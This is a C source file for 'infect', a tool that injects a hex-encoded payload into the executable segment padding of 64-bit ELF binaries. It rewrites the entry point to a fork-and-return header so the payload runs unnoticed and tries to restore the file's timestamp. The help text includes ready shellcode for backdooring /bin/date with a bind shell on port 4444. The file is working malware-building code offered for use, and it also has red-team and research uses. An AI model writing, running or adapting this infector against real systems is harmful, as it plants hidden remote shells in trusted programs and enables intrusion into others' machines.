/* infect: Copyright (C) 2011 by Brian Raiter <breadbox@muppetlabs.com>
 *         and Copyright (C) 2018 by brimstone@the.narro.ws
 * License GPLv2+: GNU GPL version 2 or later.
 * This is free software; you are free to change and redistribute it.
 * There is NO WARRANTY, to the extent permitted by law.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <fcntl.h>
#include <utime.h>
#include <elf.h>

// This header needs to be prepended to any payload.
// It forks, then jumps back to the original entrypoint.
static unsigned char header[] = {
	0x50,       // push eax, Save eax for later
	0x6a, 0x39, // push 0x39, sys_fork
	0x58,       // pop eax
	0x0f, 0x05, // syscall
	0x48,       // dec eax
	0x85, 0xc0, // test eax,eax, test if child or parent
	0x74, 0x06, // jmp ahead 6 bytes, length of parent section
	// parent section 6 (^) bytes long
	0x58,       // pop eax, from the first byte
	0xE9,       // jump backwards
	0x00, 0x00, 0x00, 0x00 // placeholder for distance to proper entrypoint
};

static unsigned char *payload;
long int payloadlen = 0;

// verbosity of run
int verbose = 0;
int skipinfection = 0;
int listsegments = 0;
char *filename;

static void showhelp(char * program){
	printf("Usage: %s\n", program);
	printf("  -f: Path to 64bit ELF binary to infect with the payload.\n");
	printf("  -p: Hex encoding of the payload.\n");
	printf("  -v: Be verbose.\n");
	printf("  -l: Only show how much room is available for a payload.\n");
	printf("\n");
	printf("Example:\n");
	printf("%s -f /bin/date -p 6a2958996a025f6a015e0f05489752c \\\n", program);
	printf("704240200115c4889e66a105a6a31580f056a32580f054831f66a2b580f \\\n");
	printf("0548976a035e48ffce6a21580f0575f66a3b589948bb2f62696e2f73680 \\\n");
	printf("0534889e752574889e60f05\n");
	printf("\n");
	printf("Infects /bin/date with a bind shell on port 4444\n");
}
/* Display an error message and exit the program.
 */
static void bail(char const *prefix, char const *msg)
{
	fprintf(stderr, "%s: %s\n", prefix, msg);
	exit(EXIT_FAILURE);
}

/* Map a file into read-write memory. The return value is a pointer to
 * the beginning of the file image. If utimbuf is not NULL, it receives
 * the file's current access and modification times.
 */
static void *mapfile(char const *filename, struct utimbuf *utimbuf)
{
	struct stat stat;
	void *ptr;
	int fd;

	if (skipinfection == 1)
		fd = open(filename, O_RDONLY, 0);
	else
		fd = open(filename, O_RDWR);
	if (fd < 0)
		bail(filename, strerror(errno));
	if (fstat(fd, &stat))
		bail(filename, strerror(errno));
	if (!S_ISREG(stat.st_mode))
		bail(filename, "not an ordinary file.");
	if (skipinfection == 1)
		ptr = mmap(NULL, stat.st_size, PROT_READ, MAP_SHARED, fd, 0);
	else
		ptr = mmap(NULL, stat.st_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (ptr == MAP_FAILED)
		bail(filename, strerror(errno));
	if (utimbuf) {
		utimbuf->actime = stat.st_atime;
		utimbuf->modtime = stat.st_mtime;
	}
	return ptr;
}

/* Examine the program segment header table and look for a segment
 * that is loaded into executable memory and is followed by enough padding
 * for our payload program to fit into. The return value is negative if
 * an appropriate segment cannot be found.
 */
static int findpayloadphdr(Elf64_Phdr const *phdr, int count)
{
	Elf64_Off pos, endpos;
	int i, j;
	unsigned long room = 0;
	unsigned long biggestroom = 0;

	if (verbose > 0)
		printf("Looking for a spot for %ld bytes of header and %ld bytes of payload\n", sizeof header, payloadlen);
	for (i = 0 ; i < count ; ++i) {
		endpos = phdr[i].p_offset + phdr[i].p_filesz;
		room = 0;
		for (j = 0 ; j < count ; ++j) {
			if (room == 0 && phdr[j].p_offset > endpos) {
				room = phdr[j].p_offset - endpos;
			}
			if (phdr[j].p_offset - endpos > 0 && phdr[j].p_offset - endpos < room) {
				room = phdr[j].p_offset - endpos;
			}
			if ((phdr[i].p_flags & PF_X) && room > biggestroom) {
				biggestroom = room;
			}
		}
		if (listsegments > 0)
		printf("Segment %2d start: %6ld size: %6ld end: %6ld room: %6ld executable: %-4s\n",
				i, phdr[i].p_offset, phdr[i].p_filesz, endpos, room, (phdr[i].p_flags & PF_X ? "yes!" : "no"));
	}
	if (verbose > 0 || listsegments > 0)
		printf("%s has room for %ld bytes of payload.\n", filename, biggestroom - sizeof header);
	for (i = 0 ; i < count ; ++i) {
		if (phdr[i].p_filesz > 0 && phdr[i].p_filesz == phdr[i].p_memsz
					 && (phdr[i].p_flags & PF_X)) {
			pos = phdr[i].p_offset + phdr[i].p_filesz;
			endpos = pos + sizeof header + payloadlen;
			for (j = 0 ; j < count ; ++j) {
				if (phdr[j].p_offset >= pos && phdr[j].p_offset < endpos
					&& phdr[j].p_filesz > 0)
				break;
			}
			if (j == count) {
				if (verbose > 0)
					printf("Segment %d looks big enough\n", i);
				return i;
			}
		}
	}
	return -1;
}

/* main().
 */
int main(int argc, char *argv[])
{
	struct utimbuf timestamps;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	Elf64_Off pos;
	char *image;
	int n, opt;
	filename = calloc (1, sizeof (char));
	// get user options
	while ((opt = getopt(argc, argv, "hvlf:p:")) != -1) {
		switch (opt) {
			case 'h': // TODO help
				showhelp(argv[0]);
				return 0;
				break;
			case 'v': // verbose
				verbose = 1;
				break;
			case 'l': // just list
				listsegments = 1;
				skipinfection = 1;
				break;
			case 'f': // filename
				if (verbose > 0)
					printf("Acting on %s\n", optarg);
				strncpy(filename, optarg, strlen(optarg));
				break;
			case 'p': // payload
				// convert this to real bytes
				if (strlen(optarg) % 2 != 0)
					bail("payload", "payload length isn't even");
				payloadlen = strlen(optarg)/2 * sizeof(char);
				payload = malloc(payloadlen);
				size_t index = 0;
			    while (index < strlen(optarg)) {
			        char c = optarg[index];
			        int value = 0;
			        if(c >= '0' && c <= '9')
			          value = (c - '0');
			        else if (c >= 'A' && c <= 'F')
			          value = (10 + (c - 'A'));
			        else if (c >= 'a' && c <= 'f')
				      value = (10 + (c - 'a'));
				    else
						bail("payload", "bad hex value");
					payload[(index/2)] += value << (((index + 1) % 2) * 4);
			        index++;
			    }
				break;
		}
	}

	// error check options
	if (filename == NULL)
		bail("null", "must have a filename");
	if (skipinfection == 0 && payloadlen == 0)
		bail("payload", "need a payload");


	/* Load the file into memory and verify that it is a 64-bit ELF
	 * executable.
	 */
	image = mapfile(filename, &timestamps);
	if (memcmp(image, ELFMAG, SELFMAG))
	bail(filename, "not an ELF file.");
	if (image[EI_CLASS] != ELFCLASS64)
	bail(filename, "not a 64-bit ELF file.");
	ehdr = (Elf64_Ehdr*)image;
	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN) {
		fprintf(stderr, "e_type %d != ET_EXEC | ET_DYN\n", ehdr->e_type);
		bail(filename, "not an executable file.");
	}

	/* Find a suitable location for our payload.
	 */
	phdr = (Elf64_Phdr*)(image + ehdr->e_phoff);
	n = findpayloadphdr(phdr, ehdr->e_phnum);
	if (n < 0)
	bail(filename, "unable to find a usable payload point");

	if (skipinfection == 1) {
		return 0;
	}
	/* Modify the executable's entry address to point to the chosen
	 * location, and modify the payload program to jump to the
	 * original entry address after it has finished.
	 */
	pos = phdr[n].p_vaddr + phdr[n].p_filesz;
	/* Calculate the new entrypoint based on the number of bytes of
	 * instructions up to the jump instruction.
	 */
	*(Elf64_Word*)(header + sizeof header - 4) =
			(Elf64_Word)ehdr->e_entry - (pos + sizeof header);
	if (verbose > 0)
		printf("entrypoint was at byte %ld\n", ehdr->e_entry);
	ehdr->e_entry = pos;
	if (verbose > 0)
		printf("entrypoint now at byte %ld\n", ehdr->e_entry);

	/* Insert the payload program into the executable.
	 */
	memcpy(image + phdr[n].p_offset + phdr[n].p_filesz,
	   header, sizeof header);
	memcpy(image + phdr[n].p_offset + phdr[n].p_filesz + sizeof header,
	   payload, payloadlen);
	phdr[n].p_filesz += sizeof header + payloadlen;
	phdr[n].p_memsz += sizeof header + payloadlen;

	/* Attempt to restore the file's original mtime. (This will fail
	 * in most situations, but there's no harm in trying.)
	 */
	utime(filename, &timestamps);

	return 0;
}
